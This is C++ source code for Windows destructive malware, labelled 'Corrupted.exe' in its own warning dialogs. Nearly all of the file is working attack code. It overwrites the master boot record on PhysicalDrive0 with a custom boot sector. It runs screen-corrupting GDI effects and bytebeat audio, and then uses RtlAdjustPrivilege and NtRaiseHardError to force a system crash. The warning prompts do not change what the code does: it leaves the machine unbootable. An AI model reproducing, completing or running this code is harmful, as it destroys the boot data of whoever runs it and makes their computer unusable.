#include <windows.h>
#define _USE_MATH_DEFINES 1
#include <cmath>
#define RGBBRUSH (DWORD)0x1900ac010e
#include <intrin.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "kernel32.lib")
#define winapi WINAPI
#define lpvoid LPVOID
#define dword DWORD
#define ulonglong ULONGLONG
#define uint UINT
#define rdtsc __rdtsc


//externing rtladjustprivilege
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
//externing ntraiseharderror
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);
const unsigned char MasterBootRecord[] = { 
0xB8, 0x02, 0x00, 0xCD, 0x10, 0xFC, 0xB8, 0x00, 0xB8, 0x8E, 0xD8, 0x8E, 0xC0, 0xBF, 0xA0, 0x0F,
0x31, 0xC0, 0xAB, 0xAB, 0xAB, 0xB0, 0xA0, 0xAB, 0xB0, 0x60, 0xAB, 0xBF, 0x4A, 0x00, 0xB8, 0x46,
0x0F, 0xAB, 0xB0, 0x2D, 0xAB, 0xB0, 0x42, 0xAB, 0xB0, 0x49, 0xAB, 0xB0, 0x52, 0xAB, 0xB0, 0x44,
0xAB, 0xB9, 0x50, 0x00, 0x51, 0xE8, 0xFC, 0x00, 0x59, 0xE2, 0xF9, 0xB4, 0x01, 0xCD, 0x16, 0x9C,
0x31, 0xC0, 0xCD, 0x16, 0x9D, 0x75, 0xF4, 0xA0, 0xA8, 0x0F, 0x02, 0x06, 0xA4, 0x0F, 0xA2, 0xA8,
0x0F, 0x24, 0xF8, 0xB4, 0x14, 0xF6, 0xE4, 0x83, 0xC0, 0x20, 0x97, 0xA0, 0xAC, 0x0F, 0x24, 0x04,
0x74, 0x14, 0x8A, 0x85, 0x60, 0xFF, 0xC7, 0x85, 0x60, 0xFF, 0x1E, 0x0D, 0x02, 0x05, 0xD0, 0xE8,
0xC7, 0x05, 0x14, 0x0D, 0xEB, 0x06, 0x8A, 0x05, 0xC7, 0x05, 0x1F, 0x0D, 0x02, 0x45, 0x02, 0xC7,
0x45, 0x02, 0x10, 0x0D, 0x3C, 0x40, 0x74, 0x27, 0xC6, 0x05, 0x2A, 0xC6, 0x45, 0x02, 0x2A, 0xBF,
0xCA, 0x07, 0xB8, 0x42, 0x0F, 0xAB, 0xB0, 0x4F, 0xAB, 0xB0, 0x4E, 0xAB, 0xB0, 0x4B, 0xAB, 0xB0,
0x21, 0xAB, 0xB9, 0x64, 0x00, 0x51, 0xE8, 0x39, 0x01, 0x59, 0xE2, 0xF9, 0xE9, 0x5E, 0xFF, 0xE8,
0x30, 0x01, 0xA0, 0xAC, 0x0F, 0x24, 0x07, 0x75, 0x04, 0xFF, 0x06, 0xA4, 0x0F, 0xB0, 0x20, 0x88,
0x85, 0x60, 0xFF, 0x88, 0x45, 0x02, 0xAA, 0xE8, 0x6A, 0x00, 0xE8, 0x67, 0x00, 0x80, 0x3E, 0xA0,
0x00, 0xB0, 0x74, 0x05, 0x80, 0x3E, 0xA2, 0x00, 0xB0, 0x75, 0x21, 0xFF, 0x06, 0xA2, 0x0F, 0xA1,
0xA2, 0x0F, 0xBF, 0x8E, 0x00, 0x31, 0xD2, 0xBB, 0x0A, 0x00, 0xF7, 0xF3, 0x81, 0xC2, 0x30, 0x0C,
0x92, 0xFD, 0xAB, 0xC6, 0x05, 0x20, 0xFC, 0x92, 0x09, 0xC0, 0x75, 0xE9, 0xB4, 0x01, 0xCD, 0x16,
0x74, 0x2F, 0xB4, 0x00, 0xCD, 0x16, 0x3C, 0x1B, 0x75, 0x02, 0xCD, 0x20, 0xA1, 0xA8, 0x0F, 0x83,
0xE8, 0x10, 0x83, 0xF8, 0x08, 0x72, 0x03, 0xA3, 0xA8, 0x0F, 0xC6, 0x06, 0xA4, 0x0F, 0x00, 0xB0,
0xB6, 0xE6, 0x43, 0xB0, 0x90, 0xE6, 0x42, 0xB0, 0x4A, 0xE6, 0x42, 0xE4, 0x61, 0x0C, 0x03, 0xE6,
0x61, 0xE9, 0x13, 0xFF, 0xBE, 0xA2, 0x00, 0xBF, 0xA0, 0x00, 0xB9, 0x4F, 0x00, 0xF3, 0xA5, 0xB8,
0x20, 0x0E, 0xAB, 0xAD, 0x81, 0xFE, 0xA2, 0x0F, 0x75, 0xF0, 0xC7, 0x06, 0x9E, 0x0F, 0xDF, 0x02,
0xE4, 0x40, 0x24, 0x70, 0x74, 0x18, 0xBB, 0x08, 0x04, 0x89, 0x1E, 0xFE, 0x0E, 0xBF, 0x5E, 0x0E,
0x24, 0x20, 0x74, 0x06, 0x89, 0x1D, 0x81, 0xEF, 0xA0, 0x00, 0xC7, 0x05, 0x1E, 0x09, 0xFF, 0x0E,
0xA6, 0x0F, 0x8B, 0x1E, 0xA6, 0x0F, 0x83, 0xFB, 0x03, 0x77, 0x66, 0x75, 0x0A, 0xE4, 0x40, 0x83,
0xE0, 0x07, 0x04, 0x04, 0xA3, 0xAA, 0x0F, 0x8B, 0x0E, 0xAA, 0x0F, 0x09, 0xDB, 0xB2, 0xB0, 0x74,
0x09, 0xB2, 0xDB, 0x83, 0xFB, 0x03, 0x72, 0x02, 0xB2, 0xB1, 0xBF, 0x3E, 0x01, 0xB4, 0x0A, 0x88,
0xD0, 0xAB, 0x81, 0xC7, 0x9E, 0x00, 0xE2, 0xF9, 0xB0, 0xC4, 0xAB, 0x81, 0xC7, 0xBE, 0x03, 0xB0,
0xDF, 0xAB, 0x81, 0xC7, 0x9E, 0x00, 0x88, 0xD0, 0xAB, 0x81, 0xC7, 0x9E, 0x00, 0x81, 0xFF, 0x00,
0x0F, 0x72, 0xF3, 0x09, 0xDB, 0x75, 0x1A, 0xA1, 0xA0, 0x0F, 0x40, 0xA3, 0xA0, 0x0F, 0xB1, 0x03,
0xD3, 0xE8, 0xB4, 0x50, 0x28, 0xC4, 0x80, 0xFC, 0x10, 0x77, 0x02, 0xB4, 0x10, 0x88, 0x26, 0xA6,
0x0F, 0xC3, 0xB4, 0x00, 0xCD, 0x1A, 0x52, 0xB4, 0x00, 0xCD, 0x1A, 0x5B, 0x39, 0xD3, 0x74, 0xF6,
0xFF, 0x06, 0xAC, 0x0F, 0xE4, 0x61, 0x24, 0xFC, 0xE6, 0x61, 0xC3, 0x4F, 0x54, 0x47, 0x55, 0xAA 
};

void mbr()
{    
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);
    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
    CloseHandle(hDevice);
}

DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
xs = dwSeed;
}
DWORD xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}
DWORD WINAPI invmelt(LPVOID lpParam)
{
    HDC hdc;
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1), x;
    while(1) {
        hdc= GetDC(0);
        x = rand() % w;
        BitBlt(hdc, x, 1, 10, h, hdc, x, 0, NOTSRCCOPY);
        Sleep(2);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI gdi4(LPVOID lpParam)
{
    int uVar1;
    ulonglong uVar2;
    uint uVar3;
    uint uVar4;
    HDC hdc;
    HPEN h;
    int right;
    uint uVar5;
    int top;
    int bottom;
    int left;
    int local_28;
    int local_1c;
    HBRUSH local_14;
    int local_10;
    uint local_c;
    uint local_8;

    uVar3 = GetSystemMetrics(0);
    uVar4 = GetSystemMetrics(1);
    hdc = GetDC((HWND)0x0);
    uVar1 = rdtsc();
    uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
    uVar5 = uVar5 ^ uVar5 << 0x11;
    local_8 = (uVar5 << 5 ^ uVar5) % uVar3;
    uVar1 = rdtsc();
    uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
    uVar5 = uVar5 ^ uVar5 << 0x11;
    local_c = (uVar5 << 5 ^ uVar5) % uVar4;
    local_14 = CreateSolidBrush(0xff);
    h = CreatePen(0, 2, 0xffffff);
    local_28 = 0;
    do {
        if (local_28 == 1) {
            local_14 = CreateSolidBrush(0xa5ff);
        }
        else if (local_28 == 2) {
            local_14 = CreateSolidBrush(0xffff);
        }
        else if (local_28 == 3) {
            local_14 = CreateSolidBrush(0xff00);
        }
        else if (local_28 == 4) {
            local_14 = CreateSolidBrush(0xffff00);
        }
        else if (local_28 == 5) {
            local_14 = CreateSolidBrush(0xff0000);
        }
        else if (local_28 == 6) {
            local_14 = CreateSolidBrush(0xd30094);
        }
        else if (local_28 == 7) {
            local_14 = CreateSolidBrush(0xff00ff);
        }
        else if (local_28 == 8) {
            local_14 = CreateSolidBrush(0xff);
            local_28 = 0;
        }
        SelectObject(hdc, local_14);
        SelectObject(hdc, h);
        if (((((int)uVar3 <= (int)local_8) || ((int)uVar4 <= (int)local_c)) || ((int)local_8 < 1)) ||
            ((int)local_c < 1)) {
            uVar1 = rdtsc();
            uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
            uVar5 = uVar5 ^ uVar5 << 0x11;
            local_8 = (uVar5 << 5 ^ uVar5) % uVar3;
            uVar1 = rdtsc();
            uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
            uVar5 = uVar5 ^ uVar5 << 0x11;
            local_c = (uVar5 << 5 ^ uVar5) % uVar4;
        }
        uVar2 = rdtsc();
        left = local_8 - 0x3c;
        top = local_c - 0x3c;
        uVar5 = (uint)uVar2 & 3;
        right = local_8 + 0x3c;
        bottom = local_c + 0x3c;
        local_1c = 10;
        local_10 = right;
        do {
            if ((uVar2 & 3) == 0) {
                Ellipse(hdc, left, top, right, bottom);
                local_8 = local_8 + 0x14;
                left = left + 0x14;
                local_10 = local_10 + 0x14;
                bottom = bottom + 0x14;
                local_c = local_c + 0x14;
                top = top + 0x14;
            LAB_004020f7:
                Sleep(0x82);
                right = local_10;
            }
            else {
                if (uVar5 == 1) {
                    Ellipse(hdc, left, top, right, bottom);
                    local_8 = local_8 + 0x14;
                    local_10 = local_10 + 0x14;
                    left = left + 0x14;
                LAB_004020ed:
                    local_c = local_c - 0x14;
                    bottom = bottom + -0x14;
                    top = top + -0x14;
                    goto LAB_004020f7;
                }
                if (uVar5 == 2) {
                    Ellipse(hdc, left, top, right, bottom);
                    local_8 = local_8 - 0x14;
                    left = left + -0x14;
                    local_10 = local_10 + -0x14;
                    bottom = bottom + 0x14;
                    local_c = local_c + 0x14;
                    top = top + 0x14;
                    goto LAB_004020f7;
                }
                if (uVar5 == 3) {
                    Ellipse(hdc, left, top, right, bottom);
                    local_8 = local_8 - 0x14;
                    local_10 = local_10 + -0x14;
                    left = left + -0x14;
                    goto LAB_004020ed;
                }
            }
            local_1c = local_1c + -1;
        } while (local_1c != 0);
        local_28 = local_28 + 1;
    } while (true);
}
DWORD WINAPI glitch1(LPVOID lpParam) {
	HDC hdc = GetDC(HWND_DESKTOP);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
	
	while (true)
	{
		HDC hdc = GetDC(HWND_DESKTOP);
		int y = rand()%sh, h = sh - rand()%sh - (sh / 1 - 8);
		HBRUSH brush = CreateSolidBrush(RGB(rand()%255, rand()%255, rand()%255));
	    SelectObject(hdc, brush);
	    BitBlt(hdc, 0, y, sw, h, hdc, rand() % 96 - 56, y, SRCCOPY);
	    PatBlt(hdc, -1, y, sw, h, PATINVERT);
	    Sleep(10);
	}
}
DWORD WINAPI payload4(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int rx;
	for (int i = 0;; i++) {
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		rx = xorshift32() % sw;
		int ry = xorshift32() % sh;
		SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
		BitBlt(desk, rx, 10, 100, sh, desk, rx, 0, RGBBRUSH);
		BitBlt(desk, rx, -10, -100, sh, desk, rx, 0, RGBBRUSH);
		BitBlt(desk, 10, ry, sw, 96, desk, 0, ry, RGBBRUSH);
		BitBlt(desk, -10, ry, sw, -96, desk, 0, ry, RGBBRUSH);
		Sleep(1);
	}
}
DWORD WINAPI shake2(LPVOID lpParam)
{
    while (1) {
        HDC hdc = GetDC(0);
        int x = SM_CXSCREEN;
        int y = SM_CYSCREEN;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCCOPY);
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}
DWORD WINAPI screenrotate(LPVOID lpParam)
{
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    RECT rekt;POINT wPt[3];
    while (1) {
        GetWindowRect(GetDesktopWindow(), &rekt);
        wPt[0].x = rand()%sw; wPt[0].y = rand() % sh;
        wPt[1].x = rand() % sw; wPt[1].y = rand() % sh;
        wPt[2].x = rand() % sw; wPt[2].y = rand() % sh;
        PlgBlt(desk, wPt, desk, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
    }
}

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*(t>>5|t>>8))>>(t>>16);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*((t>>9|t>>13)&15)&129);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*((t>>12|t>>8)&63&t>>4));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*t>>(t/768));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t>>4)*(t>>3)|t>>2);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
int main(){
    if (MessageBoxW(NULL, L"The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", L"Corrupted.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", L"Corrupt3d.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
        	mbr();
        	HANDLE thread1 = CreateThread(0, 0, invmelt, 0, 0, 0);
        	HANDLE thread2 = CreateThread(0, 0, gdi4, 0, 0, 0);
        	sound1();
        	Sleep(30000);
        	TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread3 = CreateThread(0, 0, glitch1, 0, 0, 0);
        	sound2();
        	Sleep(30000);
        	TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread4 = CreateThread(0, 0, shake2, 0, 0, 0);
            sound3();
        	Sleep(30000);
        	TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread5 = CreateThread(0, 0, payload4, 0, 0, 0);
            sound4();
        	Sleep(30000);
        	TerminateThread(thread5, 0);
            CloseHandle(thread5);
            InvalidateRect(0, 0, 0);
            Sleep(1200);
            HANDLE thread6 = CreateThread(0, 0, screenrotate, 0, 0, 0);
            sound5();
        	Sleep(30000);
			//boolean
			BOOLEAN b;
			//bsod response
			unsigned long response;
			//process privilege
			RtlAdjustPrivilege(19, true, false, &b);
			//call bsod
			NtRaiseHardError(0xC0000122, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}
